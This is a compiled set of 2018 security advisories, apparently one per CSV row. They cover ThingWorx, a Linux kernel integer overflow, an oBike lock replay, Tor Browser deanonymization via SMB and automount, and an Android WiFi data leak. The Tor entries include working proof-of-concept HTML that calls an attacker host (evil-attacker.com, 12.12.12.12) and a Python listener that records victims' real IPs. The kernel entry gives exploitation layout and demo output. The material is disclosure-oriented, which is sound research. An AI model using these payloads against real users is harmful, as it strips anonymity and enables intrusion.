~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-08-16: Vulnerability discovered
2018-08-30: Vulnerability reported to manufacturer
2018-08-30: Vulnerability confirmed by manufacturer
2018-08-31: Update released by manufacturer
2018-10-01: CVE number assigned
2018-10-02: Public disclosure of vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Collaboration Compliance and Quality Management Platform
https://www.verba.com/solutions/compliance-recording-collaboration/#Skype-for-Business
[2] Verba 9.2 Release Notes (build 9.2.2.5549) - RI-016911
https://releases.verba.com/?v=9.2
[3] SySS Security Advisory SYSS-2018-023
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-023.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Tobias Huppertz of SySS GmbH.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAluzWdUACgkQ7b4m5xTq
WHYCTA//Rl8Js5tfiRLh1kGo3K9iSZG/xYF14cQZdmE8Qe9kfuaZJ0qOZ4xfBYx6
XBEbZx/2isr9oJoeJAWKWwtRrH+OX4hjXh1SeGTdHLtikz9VD7bCz3bDibbU8NGJ
SQ3mHsnoAbxJu3xBoM4Rue4h2QHFKZlbJz8LUnS2dkOgzdyEXieuo35lGoED70OX
7+Z9dmC0B/OOf2WCV7iRj+UMeZKU2jlT3qVa8lnB+OOoShJr5hvIBJPHOX3q45tt
XA/sdojCvx+tt56z9a2Jup6AykJxcf/OKdLoUFSoZwRsoryamnxyXF7XRaqDqtHE
vztP71b9HBL2S/nQaZHb1ItHQB3cLKMuj1JEFaCTe4cToiYLZaRfdJl0nPVnSbxY
TJxXdsjJdumob5zS6JV+25mOtVSRDs5wXNketKqzm65J2Vcx5iQVol2930xiC/IF
YsaEvpIoha6H27YEETQoTQHeomVov5rm8Pov0K5Pnh1cvbTAhh6WnRAZrtnk8Ev+
rEXgovggev7E3IQwy5NFe61hbJFG9Cy7rOxK2RCAYvvGnkwsGOG45fzIiXPf1/WN
LXRIz95WBs+fjhHnRnHsBXdr7z8d9WXC1pk+cdaZBllZJ4VI/qpB6LmMe+5VRq5B
jr+oIGyGlpTYOMoVN89peB5+Uv5BM2tjEBUOiuYv0VqZeaT+QJU=
=1M8m
-----END PGP SIGNATURE-----"
844,"SEC Consult SA-20181001-0 :: Password disclosure vulnerability & XSS in PTC ThingWorx (CVE-2018-17216, CVE-2018-17217, CVE-2018-17218)",,CVE-2018-17216,"SEC Consult Vulnerability Lab Security Advisory < 20181001-0 >
=======================================================================
title: Password disclosure vulnerability & XSS
product: PTC ThingWorx
vulnerable version: 6.5-7.4, 8.0.x, 8.1.x, 8.2.x
fixed version: see Solution section
CVE number: CVE-2018-17216, CVE-2018-17217, CVE-2018-17218
impact: critical
homepage: https://www.ptc.com
found: 2018-03-13
by: M. Tomaselli (Office Munich)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
""ThingWorx is more than an IoT platform; it provides the functionality,
flexibility and scalability that businesses need to drive industrial
innovation─including the ability to source, contextualize and synthesize
data while orchestrating processes and delivering powerful web, mobile
and AR experiences.""
Source: https://www.ptc.com/en/thingworx8
Business recommendation:
------------------------
ThingWorx allows to configure Things to communicate with other services over
several protocols (e.g. LDAP integration via a DirectoryServices Thing). In
order to communicate with services that require authentification, ThingWorx
provides functionality to associate credentials to a Thing.
During a brief audit it was noticed that ThingWorx Composer leaks the
following sensitive data:
1) The PBKDF2WithHmac512 password hash of a user Thing
2) The AES encrypted password of several Things containing password attributes
Furthermore, the password used for encryption is hard-coded and thus identical
along all installations.
Besides the above mentioned vulnerabilities a reflected cross-site scripting
vulnerability was identified in the ThingWorx SQUEAL search function.
The vendor provides a patch which should be installed immediately.
It is recommended to perform further thorough security audits as the product
may be affected by other potential security vulnerabilities.
Vulnerability overview/description:
-----------------------------------
1) Disclosure of User Password Hashes to Privileged Users (CVE-2018-17216)
ThingWorx discloses the PBKDF2WithHmac512 hashed passwords of its application
users when doing exports with an administrative account. This enables an
attacker to conduct offline brute-force or dictionary attacks against the
obtained password hashes.
2) Disclosure of Encrypted Credentials and Use of Hard-Coded Passwords
(CVE-2018-17217)
A critical information disclosure vulnerability leaks the AES encrypted
passwords of services configured within ThingWorx. Due to a hard-coded
master password in the SecureData class, an attacker is able to decrypt the
obtained passwords which grants him access to other services. The AES encrypted
password gets disclosed in the server response when a user/attacker visits a
Thing that contains credentials.
3) Reflected Cross-Site Scripting (CVE-2018-17218)
The JavaScript part of the ThingWorx SQUEAL search functionality
(searchExpression parameter) which is responsible for parsing the obtained JSON
response fails to properly sanitize user supplied input. If the victim views
attacker-prepared content (e.g. on a website or in an HTML email) an attacker
is able to execute arbitrary actions in the context of its victims' sessions.
Proof of concept:
-----------------
The proof of concept has been removed from this advisory.
Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been verified to exist in version 8.0.1-b39 which was
the latest version available at the time of the test.
The vendor provided further affected version information. See the Solution
section for reference.
Vendor contact timeline:
------------------------
2018-03-14: Contacting vendor through email
2018-03-16: Advisory sent to vendor via encrypted mail
2018-03 - 2018-09: Multiple phone calls with PTC R&D department
discussing release & multi-party disclosure
2018-08-15: Vendor provided private notifications to customers to give
45 days to upgrade
2018-10-01: Coordinated release of SEC Consult advisory
Solution:
---------
Best recommendation is to upgrade to the latest version of ThingWorx
to version 8.3.2 (at time of writing).
For newer verions, the issue of the hard coded password has been fixed
and the SQUEAL function removed.
The minimum upgrade to obtain mitigations for all 3 issues depends
on the version of ThingWorx in use.
For ThingWorx versions 6.5-7.4, upgrade to 7.4.14+
For ThingWorx version 8.0.x, upgrade to 8.0.12+
For ThingWorx version 8.1.x, upgrade to 8.1.7+
For ThingWorx version 8.2.x, upgrade to 8.2.4+
The vendor always recommends upgrading to the latest availabe service pack.
See the following advisory by the vendor for further information:
https://www.ptc.com/en/support/article?n=CS291004
Workaround:
-----------
1) Disclosure of User Password Hashes to Privileged Users
To limit exposure, disabling all native ThingWorx users and solely rely on
users that make use of Active Directory or Single Sign On (SSO) authentication,
since the password hashes are then not saved within ThingWorx.
2) Disclosure of Encrypted Credentials and Use of Hard-Coded Passwords
None.
3) Reflected Cross-Site Scripting
This issue only exists because of a deprecated feature called SQUEAL. Removal
of this function will eliminate the XSS issue.
a. This SQUEAL functionality is already removed in ThingWorx 8.1.0+.
b. For versions older than 8.1.0, a workaround is available at the PTC support
site.
Updating to fix all 3 issues is recommended.
Advisory URL:
-------------
https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Vulnerability Lab
SEC Consult
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/career/index.html
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/contact/index.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF M. Tomaselli / @2018"
860,Integer overflow in Linux's create_elf_tables() (CVE-2018-14634),,CVE-2018-14634,"Qualys Security Advisory
Mutagen Astronomy: Integer overflow in Linux's create_elf_tables()
(CVE-2018-14634)
========================================================================
Contents
========================================================================
Summary
Analysis
Exploitation
Acknowledgments
Timeline
========================================================================
Summary
========================================================================
We discovered an integer overflow in the Linux kernel's
create_elf_tables() function: on a 64-bit system, a local attacker can
exploit this vulnerability via a SUID-root binary and obtain full root
privileges.
Only kernels with commit b6a2fea39318 (""mm: variable length argument
support"", from July 19, 2007) but without commit da029c11e6b1 (""exec:
Limit arg stack to at most 75% of _STK_LIM"", from July 7, 2017) are
exploitable.
Most Linux distributions backported commit da029c11e6b1 to their
long-term-supported kernels, but Red Hat Enterprise Linux and CentOS
(and Debian 8, the current ""oldstable"" version) have not, and are
therefore vulnerable and exploitable.
========================================================================
Analysis
========================================================================
150 #define STACK_ROUND(sp, items)
151 (((unsigned long) (sp - items)) &~ 15UL)
...
165 create_elf_tables(struct linux_binprm *bprm, struct elfhdr *exec,
...
169 int argc = bprm->argc;
170 int envc = bprm->envc;
171 elf_addr_t __user *sp;
...
178 int items;
...
190 p = arch_align_stack(p);
...
287 items = (argc + 1) + (envc + 1) + 1;
288 bprm->p = STACK_ROUND(sp, items);
...
295 sp = (elf_addr_t __user *)bprm->p;
""argc"", the number of command-line arguments passed to the execve()
system call, is limited to MAX_ARG_STRINGS (in fs/exec.c); ""envc"", the
number of environment variables passed to execve(), is also limited to
MAX_ARG_STRINGS; but because MAX_ARG_STRINGS is 0x7FFFFFFF, we can
overflow the integer ""items"" (at line 287) and make it negative.
As a result, we can increase the userland stack pointer instead of
decreasing it (at lines 288 and 295 -- the stack normally grows down on
x86_64), redirect the userland stack to the middle of our argument and
environment strings (which were copied to the top of the stack in
fs/exec.c), and hence overwrite these strings during the userland
execution of a SUID-root binary.
========================================================================
Exploitation
========================================================================
We execve() a SUID-root binary with exactly 0x80000000 ""items"" (i.e.,
INT_MIN ""items""): roughly 0x80000000 * sizeof(char *) = 16GB of argument
pointers, 16GB of argument strings, and 16GB of environment strings. Our
exploit requires ""only"" 2 * 16GB = 32GB of memory, instead of 3 * 16GB =
48GB or more, because we use a few tricks to reduce its memory footprint
(for example, we replace the nearly 16GB of equal argument pointers with
equivalent file-backed mappings that consume practically no memory).
The following diagram represents the layout of our userland stack when
the execution of the SUID-root binary starts, in ld.so:
| argument strings | environment strings |
--|---|--------|---------+---------|---------+---------+---------+---------|--
| A | sprand | protect | padding | protect | scratch | onebyte | padding |
--|---|--------|---------+---------|---------+---------+------^--+---------|--
| 0-8192 ~16GB 1MB rsp ~16GB
v <-------+---|----------|
| stack | B | pointers |
-------------->-------------->-------------->--------------/ 16GB
0x80000000 * sizeof(elf_addr_t) = 16GB
- ""A"" (""alpha"") is the amount of stack space allocated by
create_elf_tables() between lines 190 and 287 exclusive (for example,
the platform and base-platform capability strings): it is
approximately 512 bytes.
- ""sprand"" is a random amount of stack space allocated by
create_elf_tables() at line 190: it varies from 0 to 8192 bytes.
- The ""protect"" argument strings are vital command-line arguments and
options that must be safe from memory corruption (for example,
argv[0], the filename of the SUID-root binary).
- The ""padding"" argument strings occupy roughly 16GB of stack space.
- The ""protect"" environment strings are vital environment variables that
must be safe from memory corruption (for example, our LD_PRELOAD
environment variable, which will be processed by ld.so's
handle_ld_preload() function).
- The ""scratch"" environment strings are 1MB of safe stack space for the
userland execution of the SUID-root binary: the integer overflow of
""items"" redirects the userland stack pointer ""rsp"" to the middle of
our argument and environment strings (to an offset of 0x80000000 *
sizeof(elf_addr_t) = 16GB) -- more precisely, to the middle of our
""onebyte"" environment strings.
- The ""onebyte"" environment strings are 256KB of one-byte (empty)
environment variables that will be partly overwritten by the 4KB
fname[] buffer in ld.so's handle_ld_preload() function.
- The ""padding"" environment strings occupy roughly 16GB of stack space.
- The 16GB of argument and environment ""pointers"" (i.e., the argv[] and
envp[] arrays) are written on top of our ""padding"" environment strings
by create_elf_tables(), after the integer overflow of ""items"" and the
redirection of the userland stack pointer ""rsp"".
- ""B"" (""beta"") is the amount of stack space allocated by ld.so before
the call to handle_ld_preload(): it is approximately 9KB and is
allocated in the middle of our ""onebyte"" environment strings.
As a result, ld.so partly overwrites (i.e., rewrites) our ""onebyte""
environment variables with the fname[] buffer in handle_ld_preload()
(whose contents we control through our LD_PRELOAD environment variable)
and thereby nullifies process_envvars()'s filtering of UNSECURE_ENVVARS
(LD_AUDIT, LD_LIBRARY_PATH, LD_PRELOAD, etc). The exploitation of this
lack of UNSECURE_ENVVARS filtering in ld.so (via a suitable SUID-root
binary) is left as an exercise for the interested reader.
Our proof-of-concept (poc-exploit.c) exploits the integer overflow in
create_elf_tables() and the resulting lack of UNSECURE_ENVVARS filtering
in ld.so: it executes the main() of a SUID-root binary (poc-suidbin.c)
while LD_LIBRARY_PATH remains set, even though it should have been
removed from the environment variables by ld.so. Demonstration:
# gcc -O0 -o poc-suidbin poc-suidbin.c
# chown root poc-suidbin
# chmod 4555 poc-suidbin
$ gcc -o poc-exploit poc-exploit.c
$ time ./poc-exploit
...
ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
ERROR: ld.so: object 'LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
argc 2147090419
stack 0x7ffbe115008f < 0x7ffbe1150188 < 0x7fffe0e50128 < 0x7ff7e11503ea < 0x7ffbe102cdea
getenv 0x7ffbe114d83b .
0x7ffbe114d82b LD_LIBRARY_PATH=.
0x7ffbe114df60 LD_LIBRARY_PATH=.
0x7ffbe114df72 LD_LIBRARY_PATH=.
...
0x7ffbe114e69e LD_LIBRARY_PATH=.
0x7ffbe114e6b0 LD_LIBRARY_PATH=.
0x7ffbe114e6c2 LD_LIBRARY_PATH=.
real 5m38.666s
user 0m0.049s
sys 1m57.828s
========================================================================
Acknowledgments
========================================================================
We thank Red Hat Product Security and the members of
linux-distros vs openwall org and security kernel org.
========================================================================
Timeline
========================================================================
2018-08-31: Contacted secalert redhat com.
2018-09-18: Contacted linux-distros vs openwall org and
security kernel org.
2018-09-25: Coordinated Release Date (Time: 5:00 PM UTC)."
898,CVE-2018-16242 - oBike Electronic Lock Bypass,,CVE-2018-16242,"################################################################################
# #
# CVE-2018-16242 - oBike Electronic Lock Bypass #
# #
################################################################################
# #
# Product: oBike bicycle-sharing service #
# Vendor: oBike Inc. #
# CVE ID: CVE-2018-16242 #
# Subject: Access control bypass by replay attack on predictable nonce #
# Effect: Unauthorized unlocking of bikes, cirumventing the ride-fees #
# Author: Antoine Neuenschwander (@ant0inet) #
# Date: 2018-09-13 #
# #
################################################################################
Vendor/product description:
-----------------------------
oBike is (was) a Singaporean stationless bicycle-sharing system with operations
in several countries [1].
Introduction:
-------------
The bikes have a built-in Bluetooth lock [2]. Clients use their smartphone to
locate a bicycle. Once nearby, they unlock the bicycle directly from the app or
by scanning a QR code. Unlike traditional rental services, which require bikes
to be returned to a fixed docking station, users are free to leave the bikes
at any suitable bike parking spot.
Affected:
---------
As of August 2018, this issue seems to affect the whole oBike fleet (or what is
left of it).
Technical Description:
----------------------
The oBike lock consists of a TI CC2541 microcontroller, a power-optimized
System on a Chip (SoC) used for Bluetooth Low Energy (BLE) applications. The
lock itself has no IP connectivity; it piggybacks the mobile device's 3G/4G
connection to communicate with the oBike backend. The lock communicates via
BLE with the oBike app on the mobile device. Protocol messages are then relayed
to the oBike backend via a REST API.
oBike Lock (BLE) Mobile Device (HTTPS) oBike Backend
------------+------------------------+---------------------------+--------------
| | |
| (1) hello(lat, lng) | |
| <--------------------- | |
Generate | | |
32bit | (2) keySource | |
Challenge | ---------------------> | (3) unlockPass(keySource) |
| | ========================> | Compute
| | | Response
| (5) | (4) encKey, keys |
| sendKeys(encKey, keys) | <======================== |
!Unlock | <--------------------- | |
Bike! | | |
| | |
Generate | | |
Acknowledge | (6) macKey, index | (7) |
Message | ---------------------> | lockMessage(macKey,index) |
| | ========================> | Register
| | | Ride (start
| | | billing)
Steps:
(1) BLE send `hello` message, push GPS coordinates to lock.
(2) BLE receive `keySource`, a 32bit value used as a challenge.
(3) HTTPS send `keySource` to oBike backend via the `unlockPass` REST call.
(4) HTTPS receive `encKey` (key index) and a 128bit ciphertext in `keys`.
(5) BLE send `keys` (truncated to 96bits) and the `encKey`. At that point, the
bike will unlock.
(6) BLE receive `macKey` and `index`, an acknowledgement that the unlocking was
successful.
(7) HTTPS send `lockMessage`, with the corresponding values (`macKey` and
`index`). At that point, the oBike backend will register the ride and start
billing.
A first vulnerability [3] was found prior to this advisory, which consists in
leaving out the acknowledgement in step (7). By omitting this message, the
lock is opened but the ride is not registered at the oBike backend, therefore
not being billed.
Analysis of the `keySource` field (32 bit challenge) in step (2) showed that
the values generated by the lock are not random as expected. Rather, the
values represent the number of milliseconds since the chip was powered on. This
corresponds to a time window of roughly 50 days (2^32 milliseconds).
The 128bit ciphertext in `keys` from step (5) is used to unlock the bike. Its
value as returned by the oBike backend is the result of an unknown cryptographic
operation based on the `keySource` field (generated by the lock), and the
`encKey` value (given by the backend). Taken from the CC2541 specifications
and the length of `keys`, the value corresponds most probably to an AES-128
ciphertext. The `encKey` in turn selects the encryption key from a set of
64 distinct indices, which is chosen randomly by the backend.
Given fixed `keySource` and `encKey` values it was observed that the resulting
`keys` value is always equal, allowing for replay attacks. To this end, all
possible `keySource` values are enumerated and the corresponding `keys` and
`encKey` values captured. It is possible to replay these values offline at a
later point in time.
To limit the number of values to be enumerated, A BLE command was discovered
that provokes a chip reset. Given this condition, the generated `keySource`
lies within a predictable time window, which greatly simplifies the attack.
Now, only several seconds worth of `keySource` values are needed to implement
the replay attack.
A description of the BLE and REST protocols can be found in [4].
Workaround / Fix:
-----------------
No known fix/workaround available. The attack works offline, there is no known
possiblity to detect or to prevent it on the backend.
Timeline:
---------
2018-08-21: Found vulnerability
2018-08-22: Contact request sent to oBike Inc. support
2018-08-24: Contact request sent to SingCERT
2018-08-28: Another attempt contacting oBike Inc. support
2018-08-28: CVE-ID requested
2018-08-29: Another attempt contacting SingCERT
2018-08-29: Contact request sent to oBike Italy
2018-08-30: Response from SingCERT
2018-08-30: CVE ID assigned CVE-2018-16242
2018-09-13: No response from oBike, vulnerability disclosure
References:
-----------
[1] oBike Inc. https://www.o.bike/
[2] Smart Locker HBT203 by Hangzhou Luoping Electronics Co.,Ltd
https://fccid.io/2ALWC-HBT203
[3] ""Exploration of Weakness in Bike Sharing System""
National University of Singapore, School of Computing
CS3235 Student Projects 2017/2018
[4] Reverse engineering of the oBike protocol communication (BLE and HTTP)
https://github.com/antoinet/obike"
899,CVE-2017-16639 - Tor Browser Deanonymization With SMB,,CVE-2017-16639,"Advisory ID: SGMA18-002
Title: Tor Browser Deanonymization With SMB
Product: Tor Browser < 8.0, Firefox < 62 / < 60.2.0esr
Vendor: torproject.org, mozilla.org
Type: Information Disclosure
Risk level: 4 / 5
Credits: filippo.cavallarin wearesegment com
CVE: CVE-2017-16639
Vendor notification: 2017-11-02
Vendor fix: 2018-09-05
Public disclosure: 2018-09-12
Details
Tor Browser version < 8.0 and Firefox version < 62 / < 60.2.0esr are affected by an information disclosure vulnerability that allows remote attackers to bypass the intended anonymity feature and discover a client IP address. The vulnerability affects Windows users only and needs user interaction to be exploited.
It's a different vulnerability than CVE-2017-16541 (even if it's similar in the concept and it comes from the same author).
The vulnerability exists because the browser(s) fails to block UNC paths to be loaded in the address bar leading to a connection to an arbitrary SMB server.
The Universal Naming Convention (UNC) is the naming system used in Microsoft Windows for accessing shared network folders and printers. By accessing a UNC path it's possible to automatically mount a network share and access its resources. For example ""dir \evil-attacker.comsharefile"" will connect to evil-attacker.com using SMB protocol and get access to shared file.
When a UNC path is typed or pasted into the address bar the operating system will immediately try to connect to the specified server bypassing the configured proxy and revealing the true identity of the user. Note that the connection is triggered as soon as the UNC path is pasted into the address bar (without the need to hit the return key).
PoC
To exploit this vulnerability an attacker needs to trick the victim into pasting its malicious UNC path into the address bar of its browser and wait for SMB packets on its server.
Of course it's not exactly easy to convince someone to paste untrusted text on it's browser's address bar, but some css may help us. Consider the following (valid) UNC path:
\evil-attacker.comsharehttp://trusted.site/
in an html page the path above can be written as
<span style=""font-size:1px;opacity:0"">\evil-attacker.comshare</span>http://trusted.site/
so it's displayed as
http://trusted.site/
Doing so, instead of trick someone into pasting untrusted text, an attacker may try to send its victims to a website he/she controls and convince them to copy/paste a plausible URL.
At this point the attacker needs to be sure that the whole path is copied including the small and invisible span at the beginning.
To do so he/she can use some css to change the mouse cursor to a ""left-shifted"" one so that the mouse selection starts a few pixels before the displayed cursor. To make this sort of fake cursor an attacker needs a tool like GIMP to create a transparent image 20 pixels wide and put the image of the text-selection cursor on its right side.
A working PoC will look like this:
<style>
*{
cursor: url(shifted-cursor.cur), auto ;
}
</style>
<p>Please copy/paste the url below in the addressbar:</p>
<p><span style=""font-size:1px;opacity:0"">\evil-attacker.comshare</span>http://trusted.site/</p>
Solution
Update Tor Browser to version >= 8.0
Update Firefox to version >= 62.0 or >= 60.2.0esr
References
https://www.torproject.org/
https://www.wearesegment.com/research/tor-browser-deanonymization-with-smb/"
903,CVE-2017-16541 details: Deanonymize Tor Browser Users with Automount,,CVE-2017-16541,"Hi all,
there is the details for CVE-2017-16541 (Tor Browser information disclosure),
More infos at: https://www.wearesegment.com/research/tormoil-deanonymize-tor-browser-users-with-automount/
Tor Browser version 7.0.8, and probably prior, for Mac OS X and Linux, is affected by an information disclosure vulnerability that leads to full de-anonymization of website visitors using just a single html tag. The vulnerability also affects Firefox (ver <= 62.0 / 60.2.0 ESR).
Vulnerability Details
The vulnerability exists because Firefox fails to prevent automount/autofs to be called within a webpage using file:// handler.
Basically automount is a program that allows NFS mount points to be automatically mounted when accessed. For example it can be configured to trigger a NFS connection to test.com:/mydir when /localdir is accessed from client machine.
Automount can also be configured to allow a path starting with ‘/net/’ to specify the remote server address and path, so ‘ls /net/test.com/a’ will trigger an NFS connection to test.com. This is the default configuration on Mac OSX.
This functionality can also be triggered in many ways from a webpage by calling the file:// handler, for example with: <link href=’file:///net/test.com/a.css’ rel=’stylesheet’>.
NFS mount points are handled by the kernel so there is no way for a browser to tunnel their connections thru a proxy.
An interesting part is that this vulnerability can be exploited even if javascript is disabled.
This vulnerability only affects Mac OS X users with default configuration and Linux user with automount package installed and configured properly.
PoC
To demostrate this issue follow the steps below:
host an html page with the following content:
<link href='file:///net/12.12.12.12/a.css' rel='stylesheet'>
1.run a “tcpdump port 111”
2.load the previously hosted page into Tor Browser
watch the output of tcpdump, you should see UDP packets sent to 12.12.12.12
To exploit this vulnerability to deanonymize a Tor Browser user an attacker needs to host the malicious page on a server he/she owns, trick the victim into load the malicius page and watch the output of tcpdump (running on the webserver).
Doing so the browser of the victim will show a loading indicator until a successful NFS is preformed of until the NFS timeout is reached.
As a result the victim may notice that something unusual is happening. To prevent this the attacker has (at least) two options:
1.configure a NFS server so the victim’s machine will complete the connection without waiting
2.listen to portmap requests (UDP port 111) and immediatley reject the connection
The problem of the first solution is that the mountpoint may remain visible to the victim and it also may leave some traces on the log files.
The second solution involves some python code that terminates gracefully RPC requests:
BIND_ADDR = ""0.0.0.0""
BIND_PORT = 111
sok = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
sok.bind((BIND_ADDR, BIND_PORT))
except Exception as e:
print e
sys.exit(1)
print ""Waiting for victims on UDP port %d "" % BIND_PORT
while True:
data, addr = sok.recvfrom(1024)
ip = addr[0]
print(""TRUE IP: %s"" % ip)
# reply with PROGRAM_NOT_AVAILABLE to drop connection
# first 4bytes are packet id, the last 4 mean ""port 0""
rpl = data[:4] + ""x00x00x00x01"" + bytearray(20)
if not sok.sendto(rpl, addr):
print ""Error sending reply to %s"" % ip
Due to it’s nature, Tormoil can de-anonymize both visitors of hidden services and visitors of regular internet websites and can also be “injected” using Man In The Middle techniques (ex exit node owners).
History
This vulnerability has been discovered and reported to the Tor Project on 10-26-2017 and got fixed in a matter of days.
Tor Browser is based on Firefox that was also affected by the same vulnerability, but since the Firefox team rated this vulnerability as moderate it took longer to get fixed.
In the meantime the Tor Browser team applied a temporary fix to their browser that prevents any access to file:// resources.
This was a perfectly coherent solution since the focus of Tor Browser is user’s anonymity. However this fix broke a legitimate functionality of a “normal” browser so the Firefox team did’t implemented this solution.
Instead they worked on a solution for months to build a blacklisting mechanism that filters out “dangerous” paths and prevents the trigger of automount.
Solution
Update Tor Browser to version 7.0.9
Update Firefox to version 62.0 or 60.2.0 ESR
References
https://blog.torproject.org/tor-browser-709-released
https://www.wearesegment.com/research/tormoil-deanonymize-tor-browser-users-with-automount/
Credits
Filippo Cavallarin (filippo.cavallarin wearesegment com)"
909,Sensitive Data Exposure via WiFi Broadcasts in Android OS [CVE-2018-9489],,CVE-2018-9489,"[Blog post here:
https://wwws.nightwatchcybersecurity.com/2018/08/29/sensitive-data-exposure-via-wifi-broadcasts-in-android-os-cve-2018-9489/]
TITLE
Sensitive Data Exposure via WiFi Broadcasts in Android OS [CVE-2018-9489]
SUMMARY
System broadcasts by Android OS expose information about the user�s
device to all applications running on the device. This includes the
WiFi network name, BSSID, local IP addresses, DNS server information
and the MAC address. Some of this information (MAC address) is no
longer available via APIs on Android 6 and higher, and extra
permissions are normally required to access the rest of this
information. However, by listening to these broadcasts, any
application on the device can capture this information thus bypassing
any permission checks and existing mitigations.
Because MAC addresses do not change and are tied to hardware, this can
be used to uniquely identify and track any Android device even when
MAC address randomization is used. The network name and BSSID can be
used to geolocate users via a lookup against a database of BSSID such
as WiGLE or SkyHook. Other networking information can be used by rogue
apps to further explore and attack the local WiFi network.
All versions of Android running on all devices are believed to be
affected including forks (such as Amazon�s FireOS for the Kindle). The
vendor (Google) fixed these issues in Android P / 9 but does not plan
to fix older versions. Users are encouraged to upgrade to Android P /
9 or later. CVE-2018-9489 has been assigned by the vendor to track
this issue. Further research is also recommended to determine whether
this is being exploited in the wild.
BACKGROUND
Android is an open source operating system developed by Google for
mobile phones and tablets. It is estimated that over two billion
devices exist worldwide running Android. Applications on Android are
usually segregated by the OS from each other and the OS itself.
However, interaction between processes and/or the OS is still possible
via several mechanisms.
In particular, Android provides the use of �Intents� as one of the
ways for inter-process communication. A broadcast using an �Intent�
allows an application or the OS to send a message system-wide which
can be listened to by other applications. While functionality exists
to restrict who is allowed to read such messages, application
developers often neglect to implement these restrictions properly or
mask sensitive data. This leads to a common vulnerability within
Android applications where a malicious application running on the same
device can spy on and capture messages being broadcast by other
applications.
Another security mechanism present in the Android is permissions.
These are safeguards designed to protect the privacy of users.
Applications must explicitly request access to certain information or
features via a special �uses-permission� tag in the application
manifest (�AndroidManifest.xml�). Depending on the type of permission
(�normal�, �dangerous�, etc�) the OS may display the permission
information to the user during installation, or may prompt again
during run-time. Some permissions can only be used by system
applications and cannot be used by regular developers.
VULNERABILITY DETAILS
Android OS broadcasts information about the WiFi connection and the
WiFi network interface on a regular basis using two intents:
WifiManager�s NETWORK_STATE_CHANGED_ACTION and WifiP2pManager�s
WIFI_P2P_THIS_DEVICE_CHANGED_ACTION. This information includes the MAC
address of the device, the BSSID and network name of the WiFi access
point, and various networking information such as the local IP range,
gateway IP and DNS server addresses. This information is available to
all applications running on the user�s device.
While applications can also access this information via the
WifiManager, this normally requires the �ACCESS_WIFI_STATE� permission
in the application manifest. Geolocation via WiFi normally requires
the �ACCESS_FINE_LOCATION� or �ACCESS_COARSE_LOCATION� permissions.
Also, on Android versions 6.0 and later, the real MAC address of the
device is no longer available via APIs and will always return the
address �02:00:00:00:00:00�. However, an application listening for
system broadcasts does not need these permissions thus allowing this
information to be captured without the knowledge of the user and the
real MAC address being captured even on Android 6 or higher.
We performed testing using a test farm of mobile device ranging across
multiple types of hardware and Android versions. All devices and
versions of Android tested confirmed this behavior, although some some
devices do not display the real MAC address in the
�NETWORK_STATE_CHANGED_ACTION� intent but they still do within the
�WIFI_P2P_THIS_DEVICE_CHANGED_ACTION� intent. We also tested at least
one fork (Amazon�s FireOS for the Kindle) and those devices displayed
the same behavior.
Because MAC addresses do not change and are tied to hardware, this can
be used to uniquely identify and track any Android device even when
MAC address randomization is used. The network name and/or BSSID can
be used to geolocate users via a lookup against a database like WiGLE
or SkyHook. Other networking information can be used by rogue apps to
further explore and attack the local WiFi network.
STEPS TO REPLICATE BY REGULAR USERS
For Android device users, you can replicate these issues as follows:
1. Install the �Internal Broadcasts Monitor� application developed by
Vilius Kraujutis from Google Play
[https://play.google.com/store/apps/details?id=lt.andro.broadcastlogger].
2. Open the application and tap �Start� to monitor broadcasts.
3. Observe system broadcasts, specifically
�android.net.wifi.STATE_CHANGE� and
